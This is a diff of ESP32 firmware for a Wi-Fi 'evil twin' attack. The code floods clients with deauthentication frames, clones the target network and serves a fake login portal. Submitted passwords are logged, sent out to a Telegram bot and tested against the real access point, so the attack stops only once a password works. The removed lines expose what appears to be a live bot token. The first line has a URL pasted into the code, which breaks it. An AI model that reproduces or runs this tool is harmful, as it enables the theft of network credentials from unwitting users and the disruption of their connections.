@@ -1,24 +1,24 @@
-#include <Arduino.h>
+https://github.com/tahergaming13/evil-twin-atack-.git#include <Arduino.h>
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
 #include <SPIFFS.h>
 #include <esp_wifi.h>
-#include <WiFiClientSecure.h>   // for Telegram
+#include <WiFiClientSecure.h>
 
-// ==================== CONFIGURATION (EDIT HERE) ====================
+// ==================== CONFIGURATION ====================
 // Telegram settings
-const String TELEGRAM_BOT_TOKEN = "8663145419:AAESffhsPb8rJgMXXyR_HLDwlPfKsoDA16w";   // Replace with your bot token
-const String TELEGRAM_CHAT_ID = "6705271882";       // Replace with your chat ID
-const bool ENABLE_TELEGRAM = true;                        // Set to true after configuring
+const String TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+const String TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
+const bool ENABLE_TELEGRAM = false;
 
 // Deauth settings
-bool deauthActive = true;                                 // Deauth loop status
+bool deauthActive = false;
 unsigned long lastDeauthTime = 0;
-const unsigned long DEAUTH_INTERVAL = 100;                 // ms between deauth packets
+const unsigned long DEAUTH_INTERVAL = 100;
 
 // MAC randomization
-bool macRandomized = true;
+bool macRandomized = false;
 
 // Client fingerprinting
 struct ConnectedClient {
@@ -29,11 +29,10 @@ struct ConnectedClient {
 };
 std::vector<ConnectedClient> connectedClients;
 unsigned long lastClientUpdate = 0;
-const unsigned long CLIENT_UPDATE_INTERVAL = 5000;         // Update every 5 seconds
+const unsigned long CLIENT_UPDATE_INTERVAL = 5000;
 
 // ==================== END CONFIGURATION ====================
 
-// --- CONFIGURATION ---
 typedef struct {
   String ssid;
   uint8_t ch;
@@ -51,7 +50,6 @@ struct EvilTwinConfig {
   bool useCustomHTML = false;
 };
 
-// --- GLOBALS ---
 const byte DNS_PORT = 53;
 const char* CRED_FILE = "/creds.txt";
 
@@ -69,7 +67,7 @@ const unsigned long SCAN_INTERVAL = 30000;
 bool hotspotActive = false;
 bool scanInProgress = false;
 
-// --- UTILS ---
+// ------------------ UTILS ------------------
 String bytesToStr(const uint8_t* b, uint32_t size) {
   String str;
   for (uint32_t i = 0; i < size; i++) {
@@ -87,7 +85,7 @@ String getCurrentTime() {
   return String(buf);
 }
 
-// --- CREDENTIAL STORAGE ---
+// ------------------ CREDENTIAL STORAGE ------------------
 void logCredentialsToSPIFFS(String ssid, String capturedData, String ip) {
   File f = SPIFFS.open(CRED_FILE, "a");
   if (f) {
@@ -117,7 +115,7 @@ void clearCredentials() {
   Serial.println("[+] Credentials cleared");
 }
 
-// --- FILE SYSTEM ---
+// ------------------ FILE SYSTEM ------------------
 String loadHTMLContent(const String& filename) {
   String filepath = filename.startsWith("/") ? filename : "/" + filename;
   if (SPIFFS.exists(filepath)) {
@@ -131,7 +129,7 @@ String loadHTMLContent(const String& filename) {
   return "";
 }
 
-// --- TELEGRAM BOT INTEGRATION ---
+// ------------------ TELEGRAM ------------------
 String urlEncode(String str) {
   String encoded = "";
   char c;
@@ -152,7 +150,7 @@ String urlEncode(String str) {
 void sendToTelegram(String message) {
   if (!ENABLE_TELEGRAM) return;
   WiFiClientSecure client;
-  client.setInsecure(); // For testing; in production verify certificate
+  client.setInsecure();
   String url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
   String payload = "chat_id=" + TELEGRAM_CHAT_ID + "&text=" + urlEncode(message);
   
@@ -171,21 +169,17 @@ void sendToTelegram(String message) {
   client.stop();
 }
 
-// --- DEAUTHENTICATION ATTACK ---
+// ------------------ DEAUTHENTICATION ------------------
 void sendDeauthPacket(uint8_t* targetMAC, uint8_t* apBSSID, uint8_t channel) {
-  // Set channel
   esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-  
-  // Build deauth frame (IEEE 802.11)
   uint8_t deauthPacket[26] = {
-    0xC0, 0x00,                // Frame Control: deauth
-    0x00, 0x00,                // Duration
-    targetMAC[0], targetMAC[1], targetMAC[2], targetMAC[3], targetMAC[4], targetMAC[5], // Destination
-    apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5], // Source
-    apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5], // BSSID
-    0x00, 0x07                 // Reason code: 7 (non-associated)
+    0xC0, 0x00,
+    0x00, 0x00,
+    targetMAC[0], targetMAC[1], targetMAC[2], targetMAC[3], targetMAC[4], targetMAC[5],
+    apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5],
+    apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5],
+    0x00, 0x07
   };
-  
   esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
 }
 
@@ -203,18 +197,19 @@ void stopDeauth() {
   Serial.println("[-] Deauth loop stopped.");
 }
 
-// --- MAC ADDRESS RANDOMIZATION ---
+// ------------------ MAC RANDOMIZATION ------------------
 void randomizeMAC() {
   uint8_t newMAC[6];
-  esp_read_mac(newMAC, ESP_MAC_WIFI_SOFTAP);
-  // Randomize last 3 bytes, keep first 3 (OUI) for compatibility
+  esp_err_t err = esp_wifi_get_mac(WIFI_IF_AP, newMAC);
+  if (err != ESP_OK) {
+    Serial.println("[!] Failed to read current MAC");
+    return;
+  }
   newMAC[3] = random(0x00, 0xFF);
   newMAC[4] = random(0x00, 0xFF);
   newMAC[5] = random(0x00, 0xFF);
-  // Ensure not multicast (bit0 of first byte = 0)
   newMAC[0] &= 0xFE;
-  
-  esp_err_t err = esp_wifi_set_mac(WIFI_IF_AP, newMAC);
+  err = esp_wifi_set_mac(WIFI_IF_AP, newMAC);
   if (err == ESP_OK) {
     Serial.println("[+] MAC address randomized: " + bytesToStr(newMAC, 6));
     macRandomized = true;
@@ -223,7 +218,7 @@ void randomizeMAC() {
   }
 }
 
-// --- CLIENT FINGERPRINTING ---
+// ------------------ CLIENT FINGERPRINTING ------------------
 String getVendor(uint8_t* mac) {
   uint32_t oui = (mac[0] << 16) | (mac[1] << 8) | mac[2];
   switch (oui) {
@@ -247,7 +242,7 @@ void updateClientList() {
     ConnectedClient c;
     memcpy(c.mac, stationList.sta[i].mac, 6);
     c.vendor = getVendor(c.mac);
-    c.ip = "192.168.4." + String(i+2); // approximate IP (DHCP order)
+    c.ip = "192.168.4." + String(i+2);
     c.lastSeen = millis();
     connectedClients.push_back(c);
   }
@@ -266,14 +261,44 @@ void listClients() {
   Serial.println("-------------------------\n");
 }
 
-// --- EVIL TWIN CORE ---
+// ------------------ PASSWORD VERIFICATION ------------------
+bool testPasswordOnRealAP(String password) {
+  if (selectedNetwork.ssid.isEmpty()) {
+    Serial.println("[!] No target selected. Cannot verify password.");
+    return false;
+  }
+  Serial.printf("[*] Testing password on real AP '%s'...\n", selectedNetwork.ssid.c_str());
+  
+  // Disconnect from any existing station connection
+  WiFi.disconnect(true);
+  delay(100);
+  
+  // Try to connect to the real AP using the BSSID to avoid our own clone
+  WiFi.begin(selectedNetwork.ssid.c_str(), password.c_str(), selectedNetwork.ch, selectedNetwork.bssid);
+  
+  unsigned long start = millis();
+  while (WiFi.status() != WL_CONNECTED && (millis() - start) < 8000) { // 8 second timeout
+    delay(100);
+  }
+  
+  bool success = (WiFi.status() == WL_CONNECTED);
+  if (success) {
+    Serial.println("[+] Password is CORRECT! Connected to real AP.");
+    WiFi.disconnect(true); // Immediately disconnect
+    delay(100);
+  } else {
+    Serial.println("[-] Password is INCORRECT.");
+  }
+  return success;
+}
+
+// ------------------ EVIL TWIN CORE ------------------
 String generateEvilTwinPage() {
   if (evilTwinConfig.useCustomHTML && !evilTwinConfig.selectedCustomPage.isEmpty()) {
     String custom = loadHTMLContent(evilTwinConfig.selectedCustomPage);
     if (!custom.isEmpty()) return custom;
   }
   
-  // Hardcoded Fallback with configurable text
   String html = R"raw(<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>)raw";
   html += evilTwinConfig.title;
   html += R"raw(</title><style>body{font-family:sans-serif;background:#f0f2f5;padding:20px;text-align:center}.box{max-width:400px;margin:50px auto;background:white;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:4px}button{width:100%;padding:12px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer}</style></head><body><div class="box"><h2>)raw";
@@ -372,7 +397,7 @@ void stopEvilTwin() {
   
   Serial.println("[*] Stopping Evil Twin...");
   hotspotActive = false;
-  deauthActive = false; // stop deauth as well
+  deauthActive = false;
   dnsServer.stop();
   WiFi.softAPdisconnect(true);
   delay(500);
@@ -418,17 +443,29 @@ void updateConfig(String title, String subtitle, String body) {
   showConfig();
 }
 
-// --- CREDENTIAL PROCESSING ---
+// ------------------ CREDENTIAL PROCESSING (UPDATED) ------------------
 void processCaptivePortalLogin() {
   String ip = webServer.client().remoteIP().toString();
   String capturedData = "";
+  String password = "";
   
   for (int i = 0; i < webServer.args(); i++) {
-    capturedData += webServer.argName(i) + ": " + webServer.arg(i) + "  ";
+    String name = webServer.argName(i);
+    String value = webServer.arg(i);
+    capturedData += name + ": " + value + "  ";
+    if (name == "password") password = value;
   }
   
   if (capturedData == "" && webServer.hasArg("plain")) {
     capturedData = "RAW: " + webServer.arg("plain");
+    // crude extraction of password field from raw body
+    int passPos = webServer.arg("plain").indexOf("password=");
+    if (passPos >= 0) {
+      int end = webServer.arg("plain").indexOf('&', passPos);
+      if (end < 0) end = webServer.arg("plain").length();
+      password = webServer.arg("plain").substring(passPos + 9, end);
+      password.replace("+", " ");
+    }
   }
   
   if (capturedData == "") capturedData = "[Unknown]";
@@ -450,13 +487,34 @@ void processCaptivePortalLogin() {
     sendToTelegram(msg);
   }
   
-  String html = R"(<html><head><meta http-equiv="refresh" content="2;url=http://google.com"></head>
-  <body style="text-align:center;font-family:sans-serif;padding:50px;">
-  <h1 style="color:green;">Connected</h1><p>Redirecting...</p></body></html>)";
-  webServer.send(200, "text/html", html);
+  // --- PASSWORD VERIFICATION ---
+  bool passwordCorrect = false;
+  if (password.length() > 0) {
+    passwordCorrect = testPasswordOnRealAP(password);
+  } else {
+    Serial.println("[!] No password field found in captured data.");
+  }
+  
+  if (passwordCorrect) {
+    // Correct password: show 404 error and shut down Evil Twin
+    Serial.println("[!] Correct password entered! Shutting down Evil Twin.");
+    String html = R"(<html><head><title>404 Not Found</title></head>
+    <body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></body></html>)";
+    webServer.send(404, "text/html", html);
+    // Stop the Evil Twin after sending response
+    stopEvilTwin();
+  } else {
+    // Wrong password: show error message and keep portal
+    String html = R"(<html><head><meta name="viewport" content="width=device-width"><title>Error</title>
+    <style>body{font-family:sans-serif;text-align:center;padding:50px}</style></head>
+    <body><h2>Incorrect Password</h2><p>The password you entered is incorrect.<br>Please try again.</p>
+    <a href="/">Go back</a></body></html>)";
+    webServer.send(200, "text/html", html);
+    Serial.println("[*] Wrong password. Evil Twin continues.");
+  }
 }
 
-// --- WEB SERVER HANDLERS ---
+// ------------------ WEB SERVER HANDLERS ------------------
 void handleCaptivePortal() {
   if (!hotspotActive) {
     webServer.sendHeader("Location", "/admin");
@@ -491,7 +549,7 @@ void handleAdmin() {
   webServer.send(200, "text/html", html);
 }
 
-// --- SERIAL COMMAND PROCESSING ---
+// ------------------ SERIAL COMMAND PROCESSING ------------------
 void showHelp() {
   Serial.println("\n=== ESP32 Evil Twin Commands ===");
   Serial.println("help                    - Show this help");
@@ -587,7 +645,6 @@ void processSerialCommand(String input) {
   }
   else if (cmd == "randommac") {
     randomizeMAC();
-    // Restart AP to apply new MAC
     if (hotspotActive) stopEvilTwin();
     WiFi.softAPdisconnect(true);
     WiFi.softAP("WiFi_Pentest", "password123");
@@ -608,7 +665,7 @@ void processSerialCommand(String input) {
   }
 }
 
-// --- SETUP ---
+// ------------------ SETUP ------------------
 void setup() {
   Serial.begin(115200);
   delay(1000);
@@ -618,17 +675,14 @@ void setup() {
   Serial.println("   Educational Purpose Only");
   Serial.println("========================================");
   
-  // Initialize SPIFFS
   if (!SPIFFS.begin(true)) {
     Serial.println("[!] SPIFFS mount failed");
   } else {
     Serial.println("[+] SPIFFS mounted");
   }
   
-  // Configure WiFi
   WiFi.mode(WIFI_AP_STA);
   
-  // Set country for channels 1-13
   wifi_country_t country = {
     .cc = "CN",
     .schan = 1,
@@ -637,10 +691,8 @@ void setup() {
   };
   esp_wifi_set_country(&country);
   
-  // Randomize MAC on startup (optional)
   randomizeMAC();
   
-  // Start admin AP
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
   if (WiFi.softAP("WiFi_Pentest", "password123")) {
     Serial.printf("[+] Admin AP started: WiFi_Pentest (PW: password123)\n");
@@ -649,10 +701,8 @@ void setup() {
     Serial.println("[!] Failed to start admin AP");
   }
   
-  // Start DNS server
   dnsServer.start(DNS_PORT, "*", apIP);
   
-  // Setup web server
   webServer.on("/", handleCaptivePortal);
   webServer.on("/admin", handleAdmin);
   webServer.on("/login", handleCaptivePortal);
@@ -660,24 +710,21 @@ void setup() {
   webServer.begin();
   Serial.println("[+] Web server started");
   
-  // Initial scan
   performScan();
   
   Serial.println("\n[*] Ready! Type 'help' for commands\n");
 }
 
-// --- MAIN LOOP ---
+// ------------------ MAIN LOOP ------------------
 void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
   
-  // Auto-scan every 30 seconds if Evil Twin not active
   if (millis() - lastScan > SCAN_INTERVAL && !hotspotActive && !scanInProgress) {
     performScan();
     lastScan = millis();
   }
   
-  // Deauth loop (non-blocking)
   if (deauthActive && hotspotActive) {
     if (millis() - lastDeauthTime > DEAUTH_INTERVAL) {
       uint8_t broadcastMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
@@ -686,13 +733,11 @@ void loop() {
     }
   }
   
-  // Update client list periodically
   if (millis() - lastClientUpdate > CLIENT_UPDATE_INTERVAL) {
     updateClientList();
     lastClientUpdate = millis();
   }
   
-  // Process serial commands
   if (Serial.available()) {
     String command = Serial.readStringUntil('\n');
     processSerialCommand(command);
